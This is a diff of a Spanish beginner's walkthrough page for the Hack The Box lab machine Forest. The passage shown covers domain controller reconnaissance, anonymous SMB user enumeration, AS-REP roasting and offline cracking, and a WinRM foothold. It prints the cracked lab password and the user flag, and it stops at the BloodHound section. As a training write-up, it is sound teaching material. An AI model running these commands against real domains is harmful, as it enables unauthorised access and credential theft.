@@ -1,97 +1,51 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-<meta charset="UTF-8">
-<meta name="referrer" content="strict-origin-when-cross-origin">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="color-scheme" content="dark">
-<meta name="theme-color" content="#0b0a1a">
-<meta name="author" content="Sebastián Latorre Muñoz">
-<title>Forest · HTB · Guía para principiantes // iphobiuss</title>
-<meta name="description" content="Writeup y guía para principiantes de la máquina Forest (Hack The Box): primer Active Directory. Enumeración anónima, AS-REP Roasting, BloodHound, abuso de ACLs (GenericAll/WriteDacl), DCSync y Pass-the-Hash. Por Sebastián Latorre Muñoz (iphobiuss).">
-<link rel="canonical" href="https://iphobiuss.github.io/forest.html">
-<meta property="og:title" content="Forest · HTB · Guía para principiantes">
-<meta property="og:description" content="Primera máquina de Active Directory: de la enumeración anónima a Domain Admin, paso a paso y razonado.">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://iphobiuss.github.io/forest.html">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' shape-rendering='crispEdges'%3E%3Crect width='24' height='24' fill='%230b0a1a'/%3E%3Cg fill='%2339ff14'%3E%3Crect x='8' y='3' width='8' height='2'/%3E%3Crect x='7' y='5' width='2' height='4'/%3E%3Crect x='15' y='5' width='2' height='4'/%3E%3Crect x='5' y='9' width='14' height='12'/%3E%3C/g%3E%3Cg fill='%230b0a1a'%3E%3Crect x='11' y='12' width='2' height='4'/%3E%3Crect x='10' y='16' width='4' height='2'/%3E%3C/g%3E%3C/svg%3E">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=IBM+Plex+Mono:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="assets/css/base.css">
-<link rel="stylesheet" href="assets/css/writeup.css">
-<style>
-  :root{--machine:var(--violet);}
-</style>
-</head>
-<body>
-<a class="skip" href="#contenido">Saltar al contenido</a>
-<div class="crt"></div>
-
-<div class="topbar">
-<nav aria-label="Navegación">
-  <span class="brand"><b>iphobiuss</b>::offsec</span>
-  <span class="links">
-    <a href="index.html">← KNOWLEDGE BASE</a>
-    <a href="knife.html">KNIFE</a>
-    <a href="#recon">RECON</a><a href="#enum">ENUM</a><a href="#asrep">AS-REP</a>
-    <a href="#foothold">FOOTHOLD</a><a href="#bloodhound">BLOODHOUND</a><a href="#privesc">PRIVESC</a><a href="#tasks">TASKS</a><a href="#takeaways">TAKEAWAYS</a>
-  </span>
-</nav>
-</div>
-
-<main id="contenido">
-<header>
-  <div class="hero">
-    <div class="prompt mono"><span class="g">iphobiuss@offsec</span>:<span class="c">~</span>$ ./pwn --box forest --domain htb.local</div>
-    <h1 class="pixel">FOREST</h1>
-    <div class="meta">
+<!doctype html>
+<html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="color-scheme" content="dark"><meta name="theme-color" content="#0b0d15"><meta name="referrer" content="strict-origin-when-cross-origin"><meta name="author" content="Sebastián Latorre Muñoz">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'sha256-n3MQxRbgUdFR/TSoDzLhSwZPZ3RaoaP91nmdmAiZqq0='; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data:; object-src 'none'; base-uri 'none'; form-action 'self'">
+<title>Forest · Guía HTB // iphobiuss</title><meta name="description" content="Writeup y guía para principiantes de la máquina Forest (Hack The Box): primer Active Directory. Enumeración anónima, AS-REP Roasting, BloodHound, abuso de ACLs (GenericAll/WriteDacl), DCSync y Pass-the-Hash. Por Sebastián Latorre Muñoz (iphobiuss)."><link rel="canonical" href="https://iphobiuss.github.io/forest.html"><meta property="og:title" content="Forest · Guía HTB"><meta property="og:description" content="Writeup y guía para principiantes de la máquina Forest (Hack The Box): primer Active Directory. Enumeración anónima, AS-REP Roasting, BloodHound, abuso de ACLs (GenericAll/WriteDacl), DCSync y Pass-the-Hash. Por Sebastián Latorre Muñoz (iphobiuss)."><meta property="og:type" content="article"><meta property="og:url" content="https://iphobiuss.github.io/forest.html"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Forest · Guía HTB"><meta name="twitter:description" content="Writeup y guía para principiantes de la máquina Forest (Hack The Box): primer Active Directory. Enumeración anónima, AS-REP Roasting, BloodHound, abuso de ACLs (GenericAll/WriteDacl), DCSync y Pass-the-Hash. Por Sebastián Latorre Muñoz (iphobiuss)."><link rel="icon" href="assets/img/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="assets/css/site.css"><script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "name": "Forest · Guía HTB", "description": "Writeup y guía para principiantes de la máquina Forest (Hack The Box): primer Active Directory. Enumeración anónima, AS-REP Roasting, BloodHound, abuso de ACLs (GenericAll/WriteDacl), DCSync y Pass-the-Hash. Por Sebastián Latorre Muñoz (iphobiuss).", "url": "https://iphobiuss.github.io/forest.html", "inLanguage": "es", "author": {"@type": "Person", "name": "Sebastián Latorre Muñoz", "url": "https://iphobiuss.github.io/"}, "headline": "Forest · Guía HTB", "dateModified": "2026-09-08"}</script><script src="assets/js/site.js" defer></script></head>
+<body data-page="forest"><a class="skip" href="#contenido">Saltar al contenido</a>
+ <header class="site-header"><div class="header-inner"><a class="brand" href="index.html">iphobiuss<span>::offsec</span></a>
+ <nav class="site-nav" id="site-nav" aria-label="Navegación principal"><a href="index.html">Inicio</a><a href="guias.html" aria-current="page">Guías</a><a href="tecnicas.html">Técnicas</a><a href="herramientas.html">Herramientas</a><a href="proyectos.html">Proyectos</a></nav>
+ <div class="header-tools"><a class="icon-button" href="buscar.html" aria-label="Buscar en el sitio">Buscar</a><button type="button" class="icon-button retro-toggle js-only" data-retro-toggle aria-pressed="false" hidden>Efectos retro</button><button type="button" class="icon-button menu-toggle" aria-controls="site-nav" aria-expanded="false" hidden>Menú</button></div></div><div class="reading-progress" aria-hidden="true"></div></header><main class="site-main" id="contenido" tabindex="-1"><div class="page-head"><div class="shell"><p class="eyebrow"><a href="guias.html">Guías</a> / 03 · Windows / AD</p><h1>FOREST</h1><div class="meta">
       <span class="badge b1">HTB</span>
       <span class="badge b2">WINDOWS</span>
       <span class="badge b3">EASY</span>
       <span class="badge b4">ACTIVE DIRECTORY</span>
       <span class="badge b5">DCSYNC</span>
     </div>
-    <p class="pitch">Guía para principiantes de <b>Forest</b>, la <b>#3</b> de la serie y la <b>primera de Active Directory</b>. Cambia el paradigma respecto a <a href="cap.html">Cap</a> y <a href="knife.html">Knife</a>: aquí no hay web ni exploit de servicio: es un ataque de dominio completo. De la enumeración anónima a <b>Domain Admin</b>, razonando cada salto. Si es tu primera AD, es normal sentirse perdido al inicio: AD es otro mundo, y esta guía te lleva de la mano por él.</p>
-
-    <div class="chain">
-      <div class="lnk" style="--acc:var(--cyan)"><div class="n">01</div><div class="t"><b>RECON</b><br>DC · 23 puertos</div></div>
-      <div class="lnk" style="--acc:var(--amber)"><div class="n">02</div><div class="t"><b>ENUM</b><br>SMB anónimo · 31 users</div></div>
-      <div class="lnk" style="--acc:var(--magenta)"><div class="n">03</div><div class="t"><b>AS-REP</b><br>roast → crack → s3rvice</div></div>
-      <div class="lnk" style="--acc:var(--green)"><div class="n">04</div><div class="t"><b>FOOTHOLD</b><br>WinRM → svc-alfresco</div></div>
-      <div class="lnk" style="--acc:var(--cyan)"><div class="n">05</div><div class="t"><b>BLOODHOUND</b><br>mapa del dominio</div></div>
-      <div class="lnk" style="--acc:var(--violet)"><div class="n">06</div><div class="t"><b>PRIVESC</b><br>ACLs → DCSync → PtH</div></div>
-    </div>
-  </div>
-</header>
-
-<div class="intro">
+    <div class="article-meta"><time datetime="2026-09-08">Edición: 8 sep 2026</time><span>12 min de lectura aprox.</span><span>Easy</span></div><p>Guía para principiantes de <b>Forest</b>, la <b>#3</b> de la serie y la <b>primera de Active Directory</b>. Cambia el paradigma respecto a <a href="cap.html">Cap</a> y <a href="knife.html">Knife</a>: aquí no hay web ni exploit de servicio: es un ataque de dominio completo. De la enumeración anónima a <b>Domain Admin</b>, razonando cada salto. Si es tu primera AD, es normal sentirse perdido al inicio: AD es otro mundo, y esta guía te lleva de la mano por él.</p></div></div><div class="shell article-layout"><aside class="article-toc"><span class="toc-label">En esta guía</span><nav aria-label="Índice de la guía"><a href="#recon">01 · RECONOCIMIENTO DE UN DC</a><a href="#enum">02 · ENUMERACIÓN ANÓNIMA</a><a href="#asrep">03 · AS-REP ROASTING + CRACKING</a><a href="#foothold">04 · FOOTHOLD · WINRM</a><a href="#bloodhound">05 · BLOODHOUND</a><a href="#privesc">06 · ACLs → DCSYNC → PASS-THE-HASH</a><a href="#tasks">TASKS · GUIDED MODE</a><a href="#takeaways">CONCEPTOS NUEVOS (EL MUNDO AD)</a></nav></aside><div class="article-content"><details class="mobile-toc"><summary>En esta guía</summary><nav aria-label="Índice móvil"><a href="#recon">01 · RECONOCIMIENTO DE UN DC</a><a href="#enum">02 · ENUMERACIÓN ANÓNIMA</a><a href="#asrep">03 · AS-REP ROASTING + CRACKING</a><a href="#foothold">04 · FOOTHOLD · WINRM</a><a href="#bloodhound">05 · BLOODHOUND</a><a href="#privesc">06 · ACLs → DCSYNC → PASS-THE-HASH</a><a href="#tasks">TASKS · GUIDED MODE</a><a href="#takeaways">CONCEPTOS NUEVOS (EL MUNDO AD)</a></nav></details><div class="notice">
   <b>Requisitos:</b> cuenta HTB (VIP para retiradas), Kali, y la VPN levantada (una a la vez: <span class="mono">sudo pkill openvpn</span> antes de reconectar, como en <a href="knife.html">Knife</a>).
   <br><br>
   <b>Herramientas nuevas que usa esta máquina:</b> <span class="mono">netexec</span>, <span class="mono">impacket-GetNPUsers</span>, <span class="mono">john</span>, <span class="mono">evil-winrm</span>, <span class="mono">bloodhound-python</span> + <span class="mono">BloodHound CE</span>, <span class="mono">PowerView</span>, <span class="mono">impacket-secretsdump</span>. La mayoría vienen en Kali (según la instalación). En esta guía la IP objetivo es <span class="mono">10.129.62.145</span> y la IP del atacante (tun0) <span class="mono">10.10.14.57</span>; las tuyas serán distintas.
 </div>
 
-<!-- ===================== RECON ===================== -->
-<section id="recon" style="--acc:var(--cyan)">
+<details class="spoiler"><summary>Resumen del recorrido · contiene spoilers</summary><div class="chain">
+      <div class="lnk"><div class="n">01</div><div class="t"><b>RECON</b><br>DC · 23 puertos</div></div>
+      <div class="lnk"><div class="n">02</div><div class="t"><b>ENUM</b><br>SMB anónimo · 31 users</div></div>
+      <div class="lnk"><div class="n">03</div><div class="t"><b>AS-REP</b><br>roast → crack → s3rvice</div></div>
+      <div class="lnk"><div class="n">04</div><div class="t"><b>FOOTHOLD</b><br>WinRM → svc-alfresco</div></div>
+      <div class="lnk"><div class="n">05</div><div class="t"><b>BLOODHOUND</b><br>mapa del dominio</div></div>
+      <div class="lnk"><div class="n">06</div><div class="t"><b>PRIVESC</b><br>ACLs → DCSync → PtH</div></div>
+    </div>
+  </details><details class="environment"><summary>Entorno y versiones documentadas</summary><ul><li>Kali Linux y VirtualBox: versiones no especificadas en la guía original.</li><li>Análisis: BloodHound CE; versión exacta no indicada.</li></ul><p>Las versiones indicadas provienen del texto original. La fecha de edición identifica la revisión de esta página; no implica que se haya repetido el laboratorio.</p></details><div class="guide-controls js-only" hidden><span>Modo de lectura</span><button class="small-button" type="button" data-guide-mode="full" aria-pressed="true">Guía completa</button><button class="small-button" type="button" data-guide-mode="hints" aria-pressed="false">Solo pistas</button><button class="small-button print-button" type="button" data-print>Imprimir / PDF</button></div><section id="recon">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">01 · RECONOCIMIENTO DE UN DC</h2></div>
     <div class="sec-focus">23 puertos no asustan: son la huella de un Domain Controller.</div>
 
-    <div class="fcard cyan">
+    <div class="hint"><b>PISTA</b>Identifica los puertos abiertos, sus servicios y versiones. Anota una hipótesis de entrada por cada servicio.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><div class="fcard cyan">
       <h4>▚ Dominio y Domain Controller</h4>
       <p>Un <b>dominio</b> gestiona de forma centralizada muchos equipos y usuarios bajo un mismo paraguas (la cuenta corporativa con la que inicia sesión toda una empresa). El <b>Domain Controller (DC)</b> es el servidor que manda: centraliza las cuentas, grupos, permisos y los secretos de autenticación (no contraseñas en texto claro, sino material derivado de ellas), y autentica a todos. <b>Forest es un DC.</b> Comprometer un DC es comprometer el dominio entero, por eso es el objetivo más goloso.</p>
     </div>
 
     <h3 class="step">Barrido y detección</h3>
-    <pre><span class="k">mkdir</span> -p ~/htb/forest/nmap &amp;&amp; <span class="k">cd</span> ~/htb/forest
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">mkdir</span> -p ~/htb/forest/nmap &amp;&amp; <span class="k">cd</span> ~/htb/forest
 <span class="k">nmap</span> -p- --min-rate 1000 -oA nmap/allports 10.129.62.145
-<span class="k">nmap</span> -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA nmap/detail 10.129.62.145</pre>
-    <div class="why"><b>EL TTL, UNA PISTA DEL SO</b>El ping devolvía <code class="ic">ttl=127</code>. Windows suele partir su TTL en 128 (baja 1 por salto) y Linux en 64, así que <code class="ic">~127</code> sugiere Windows y <code class="ic">~63</code> Linux. Es una pista frecuente en labs, no una prueba (el TTL se puede modificar y depende de los saltos). Aquí encaja con que AD es tecnología Microsoft, y se confirma con el fingerprint.</div>
+<span class="k">nmap</span> -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA nmap/detail 10.129.62.145</code></pre>
+    </figure><div class="why"><b>EL TTL, UNA PISTA DEL SO</b>El ping devolvía <code class="ic">ttl=127</code>. Windows suele partir su TTL en 128 (baja 1 por salto) y Linux en 64, así que <code class="ic">~127</code> sugiere Windows y <code class="ic">~63</code> Linux. Es una pista frecuente en labs, no una prueba (el TTL se puede modificar y depende de los saltos). Aquí encaja con que AD es tecnología Microsoft, y se confirma con el fingerprint.</div>
 
     <h3 class="step">Leer un DC de un vistazo</h3>
     <p class="f">A diferencia de Cap (3 puertos) y Knife (2), un DC devuelve <b>23</b>. Los <code class="ic">4966x/4967x</code> son RPC dinámico (ruido). Los que importan forman la huella de AD:</p>
     <div class="tblwrap"><table>
-      <tr><th>Puerto</th><th>Servicio</th><th>Qué significa</th></tr>
+      <tr><th scope="col">Puerto</th><th scope="col">Servicio</th><th scope="col">Qué significa</th></tr>
       <tr><td><code>88</code></td><td>Kerberos</td><td>La estrella: el sistema de autenticación de AD. Es una pieza característica de la huella de AD; por sí solo no prueba que sea un DC, pero junto a LDAP, SMB y DNS la inferencia es fuerte. La técnica de Forest lo ataca.</td></tr>
       <tr><td><code>389 / 636</code></td><td>LDAP / LDAPS</td><td>La "guía telefónica" del dominio: usuarios, grupos, permisos. Clave para enumerar. Permite <em>anonymous bind</em>.</td></tr>
       <tr><td><code>445</code></td><td>SMB</td><td>Comparticiones Windows. Aquí acepta sesión nula (<code>guest</code>).</td></tr>
@@ -102,164 +56,158 @@
 
     <h3 class="step">Mapear el dominio en /etc/hosts (resolución de nombres)</h3>
     <p class="f">Muchas herramientas de AD (sobre todo las de Kerberos) fallan si les hablas por IP: necesitan el <b>nombre</b>. Enséñale a Kali a resolver el dominio:</p>
-    <pre><span class="k">sudo</span> sh -c 'echo "10.129.62.145 htb.local forest.htb.local FOREST" &gt;&gt; /etc/hosts'
-<span class="k">ping</span> -c 2 forest.htb.local   <span class="cmt"># debe resolver el nombre a la IP</span></pre>
-    <div class="why"><b>RESOLUCIÓN DE NOMBRES EN AD</b>Kerberos y muchas herramientas de AD necesitan resolver el nombre del dominio, no la IP. Si tu Kali no usa el DNS del DC, ese nombre se mapea en <code class="ic">/etc/hosts</code>: es lo habitual en labs, no un requisito inherente de AD. Y un dominio por vez: limpia entradas viejas de otros labs para no confundirte.</div>
-  </div>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">sudo</span> sh -c 'echo "10.129.62.145 htb.local forest.htb.local FOREST" &gt;&gt; /etc/hosts'
+<span class="k">ping</span> -c 2 forest.htb.local   <span class="cmt"># debe resolver el nombre a la IP</span></code></pre>
+    </figure><div class="why"><b>RESOLUCIÓN DE NOMBRES EN AD</b>Kerberos y muchas herramientas de AD necesitan resolver el nombre del dominio, no la IP. Si tu Kali no usa el DNS del DC, ese nombre se mapea en <code class="ic">/etc/hosts</code>: es lo habitual en labs, no un requisito inherente de AD. Y un dominio por vez: limpia entradas viejas de otros labs para no confundirte.</div>
+  </details></div>
 </section>
 
-<!-- ===================== ENUM ===================== -->
-<section id="enum" style="--acc:var(--amber)">
+<section id="enum">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">02 · ENUMERACIÓN ANÓNIMA</h2></div>
     <div class="sec-focus">Sin credenciales, pero el dominio ya nos habla.</div>
 
-    <div class="fcard amber">
+    <div class="hint"><b>PISTA</b>Comprueba qué información permite consultar el servicio sin credenciales, empezando por los nombres de usuario.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><div class="fcard amber">
       <h4>▚ SMB y por qué el acceso anónimo importa</h4>
       <p><b>SMB</b> es el protocolo de Windows para compartir archivos y recursos en red. Cuando permite acceso <b>anónimo/guest</b>, puedes preguntarle cosas sin credenciales, entre ellas a veces <b>la lista de usuarios del dominio</b>. Y conseguir esa lista es el primer gran paso en AD: necesitas saber <em>a quién</em> atacar.</p>
     </div>
 
     <h3 class="step">Confirmar sesión nula y sacar usuarios</h3>
-    <pre><span class="k">netexec</span> smb 10.129.62.145 -u '' -p ''            <span class="cmt"># (Null Auth:True) = acepta anónimo</span>
-<span class="k">netexec</span> smb 10.129.62.145 -u '' -p '' --users    <span class="cmt"># lista los usuarios del dominio</span></pre>
-    <p class="f">El <code class="ic">--users</code> devuelve <b>31 usuarios</b>. La habilidad clave es separar el grano de la paja:</p>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">netexec</span> smb 10.129.62.145 -u '' -p ''            <span class="cmt"># (Null Auth:True) = acepta anónimo</span>
+<span class="k">netexec</span> smb 10.129.62.145 -u '' -p '' --users    <span class="cmt"># lista los usuarios del dominio</span></code></pre>
+    </figure><p class="f">El <code class="ic">--users</code> devuelve <b>31 usuarios</b>. La habilidad clave es separar el grano de la paja:</p>
     <div class="tblwrap"><table>
-      <tr><th>Ruido (ignorar)</th><th>Grano (personas / cuentas reales)</th></tr>
+      <tr><th scope="col">Ruido (ignorar)</th><th scope="col">Grano (personas / cuentas reales)</th></tr>
       <tr><td><code>Administrator</code>, <code>Guest</code>, <code>krbtgt</code>, <code>DefaultAccount</code> (integradas) · <code>SM_*</code>, <code>HealthMailbox*</code>, <code>$*</code> (cuentas de Exchange, autogeneradas)</td><td><code>sebastien</code>, <code>lucinda</code>, <code>andy</code>, <code>mark</code>, <code>santi</code>, y <b><code>svc-alfresco</code></b></td></tr>
     </table></div>
     <div class="why"><b>EL PREFIJO svc-</b><code class="ic">svc-alfresco</code> salta a la vista: <code class="ic">svc-</code> = <em>service account</em> (cuenta de servicio, no persona). Son objetivos interesantes porque pueden tener configuraciones o credenciales débiles, así que el prefijo <code class="ic">svc-</code> justifica priorizar su revisión. Pero eso no implica por sí mismo que sea vulnerable a AS-REP Roasting: es un reflejo de "investigar primero", no de "asumir vulnerable".</div>
 
     <p class="f">Guarda los usuarios-persona en un archivo (los necesitarás):</p>
-    <pre><span class="k">echo</span> 'sebastien
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">echo</span> 'sebastien
 lucinda
 andy
 mark
 santi
-svc-alfresco' &gt; users.txt</pre>
-  </div>
+svc-alfresco' &gt; users.txt</code></pre>
+  </figure></details></div>
 </section>
 
-<!-- ===================== AS-REP ===================== -->
-<section id="asrep" style="--acc:var(--magenta)">
+<section id="asrep">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">03 · AS-REP ROASTING + CRACKING</h2></div>
     <div class="sec-focus">Pedir material AS-REP de un usuario sin autenticarte y atacarlo offline.</div>
 
-    <div class="fcard magenta">
+    <div class="hint"><b>PISTA</b>Investiga si todas las cuentas exigen preautenticación y qué respuesta entrega el servicio cuando no la requieren.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><div class="fcard magenta">
       <h4>▚ AS-REP Roasting</h4>
       <p>Normalmente Kerberos exige <b>pre-autenticarte</b> antes de darte información. Pero existe una opción de cuenta, <b>"no requiere pre-autenticación"</b>, que si está activada hace que Kerberos te entregue información cifrada <b>sin autenticarte</b>. Esa información contiene algo derivado de la <b>contraseña</b> del usuario. Si la capturas, la crackeas offline.</p>
       <p><b>AS-REP Roasting</b> = solicitar un AS-REP de una cuenta sin pre-autenticación y atacar offline la porción cifrada con una clave derivada de su contraseña. El tooling lo llama coloquialmente "hash" (<code class="ic">$krb5asrep$</code>, <code class="ic">hash.txt</code>), pero es material cifrado, no una huella unidireccional.</p>
     </div>
 
     <h3 class="step">Pedir los hashes</h3>
-    <pre><span class="k">impacket-GetNPUsers</span> htb.local/ -no-pass -usersfile users.txt</pre>
-    <p class="f">Los cinco usuarios-persona responden <code class="ic">doesn't have UF_DONT_REQUIRE_PREAUTH set</code> (bien configurados). Pero <b>svc-alfresco</b> suelta el premio: un hash <code class="ic">$krb5asrep$...</code>. Guárdalo:</p>
-    <pre><span class="k">impacket-GetNPUsers</span> htb.local/ -no-pass -usersfile users.txt | grep '\$krb5asrep\$' &gt; hash.txt</pre>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">impacket-GetNPUsers</span> htb.local/ -no-pass -usersfile users.txt</code></pre>
+    </figure><p class="f">Los cinco usuarios-persona responden <code class="ic">doesn't have UF_DONT_REQUIRE_PREAUTH set</code> (bien configurados). Pero <b>svc-alfresco</b> suelta el premio: un hash <code class="ic">$krb5asrep$...</code>. Guárdalo:</p>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">impacket-GetNPUsers</span> htb.local/ -no-pass -usersfile users.txt | grep '\$krb5asrep\$' &gt; hash.txt</code></pre>
 
-    <h3 class="step">Crackear offline</h3>
+    </figure><h3 class="step">Crackear offline</h3>
     <p class="f">Ojo con el vocabulario: <code class="ic">GetNPUsers</code> devuelve el <b>AS-REP</b> en un formato que john/hashcat atacan offline, pero no es una simple huella unidireccional de la contraseña. Parte del AS-REP está <b>cifrada con una clave derivada de la contraseña</b> del usuario, así que pruebas candidatos localmente hasta dar con uno que descifre correctamente el mensaje. Se hace <b>offline</b> (en tu Kali, sin tocar la víctima, intentos ilimitados) con un diccionario. hashcat es lo estándar, pero en una VM sin GPU falla:</p>
-    <pre><span class="k">hashcat</span> -m 18200 hash.txt rockyou.txt   <span class="cmt"># falla: no OpenCL/CUDA (VM sin GPU)</span>
-<span class="k">john</span> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   <span class="cmt"># funciona: detecta el tipo solo</span></pre>
-    <p class="f">John lo rompe en un segundo: <b><code class="ic">svc-alfresco : s3rvice</code></b>.</p>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">hashcat</span> -m 18200 hash.txt rockyou.txt   <span class="cmt"># falla: no OpenCL/CUDA (VM sin GPU)</span>
+<span class="k">john</span> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   <span class="cmt"># funciona: detecta el tipo solo</span></code></pre>
+    </figure><p class="f">John lo rompe en un segundo: <b><code class="ic">svc-alfresco : s3rvice</code></b>.</p>
     <div class="why"><b>hashcat vs john</b>hashcat brilla con GPU; en una VM sin GPU, <b>john</b> es tu herramienta de cracking (usa CPU sin quejarse y autodetecta el tipo de hash). Ten ambas en el arsenal.</div>
-  </div>
+  </details></div>
 </section>
 
-<!-- ===================== FOOTHOLD ===================== -->
-<section id="foothold" style="--acc:var(--green)">
+<section id="foothold">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">04 · FOOTHOLD · WINRM</h2></div>
     <div class="sec-focus">De anónimo a usuario autenticado del dominio.</div>
 
-    <h3 class="step">Validar credenciales (buen reflejo en AD)</h3>
+    <div class="hint"><b>PISTA</b>Valida las credenciales conseguidas en un servicio de acceso remoto disponible.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><h3 class="step">Validar credenciales (buen reflejo en AD)</h3>
     <p class="f">Antes de usar unas credenciales nuevas, compruébalas. Y verifica si sirven para WinRM:</p>
-    <pre><span class="k">netexec</span> smb 10.129.62.145 -u svc-alfresco -p s3rvice    <span class="cmt"># [+] = válidas</span>
-<span class="k">netexec</span> winrm 10.129.62.145 -u svc-alfresco -p s3rvice  <span class="cmt"># (Pwn3d!) = puede entrar por WinRM</span></pre>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">netexec</span> smb 10.129.62.145 -u svc-alfresco -p s3rvice    <span class="cmt"># [+] = válidas</span>
+<span class="k">netexec</span> winrm 10.129.62.145 -u svc-alfresco -p s3rvice  <span class="cmt"># (Pwn3d!) = puede entrar por WinRM</span></code></pre>
 
-    <h3 class="step">Conseguir shell</h3>
+    </figure><h3 class="step">Conseguir shell</h3>
     <p class="f"><b>evil-winrm</b> es el "SSH de Windows": administración remota que da una terminal PowerShell con credenciales válidas.</p>
-    <pre><span class="k">evil-winrm</span> -i 10.129.62.145 -u svc-alfresco -p s3rvice</pre>
-    <p class="f">Caes en <code class="ic">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt;</code>. Estás dentro del DC como svc-alfresco.</p>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">evil-winrm</span> -i 10.129.62.145 -u svc-alfresco -p s3rvice</code></pre>
+    </figure><p class="f">Caes en <code class="ic">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt;</code>. Estás dentro del DC como svc-alfresco.</p>
 
     <h3 class="step">User flag</h3>
     <p class="f">En Windows la flag está en el <b>Desktop</b>, no en <code class="ic">/home</code>. Comandos de PowerShell: <code class="ic">cd</code>, <code class="ic">dir</code> (el <code class="ic">ls</code>), <code class="ic">type</code> (el <code class="ic">cat</code>).</p>
-    <pre><span class="k">cd</span> C:\Users\svc-alfresco\Desktop
-<span class="k">type</span> user.txt   <span class="cmt"># -&gt; 8a961daab9f55e5a4a4a738aa69b0434</span></pre>
-  </div>
+    <figure class="code-block" data-code-kind="command"><figcaption><span>Comandos / terminal</span><button type="button" class="copy-button js-only" data-copy="" hidden="hidden" aria-label="Copiar comandos / terminal">Copiar</button></figcaption><pre tabindex="0" aria-label="Comandos / terminal; desplazamiento horizontal disponible"><code><span class="k">cd</span> C:\Users\svc-alfresco\Desktop
+<span class="k">type</span> user.txt   <span class="cmt"># -&gt; 8a961daab9f55e5a4a4a738aa69b0434</span></code></pre>
+  </figure></details></div>
 </section>
 
-<!-- ===================== BLOODHOUND ===================== -->
-<section id="bloodhound" style="--acc:var(--cyan)">
+<section id="bloodhound">
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">05 · BLOODHOUND</h2></div>
     <div class="sec-focus">La escalada en AD es sobre relaciones y permisos, no sobre un binario.</div>
 
-    <div class="fcard cyan">
+    <div class="hint"><b>PISTA</b>Sigue las relaciones que salen de la cuenta actual. Distingue pertenencia a grupos y permisos sobre objetos.</div><details class="solution" open="open"><summary>Ver solución paso a paso</summary><div class="fcard cyan">
       <h4>▚ ¿Qué es BloodHound?</h4>
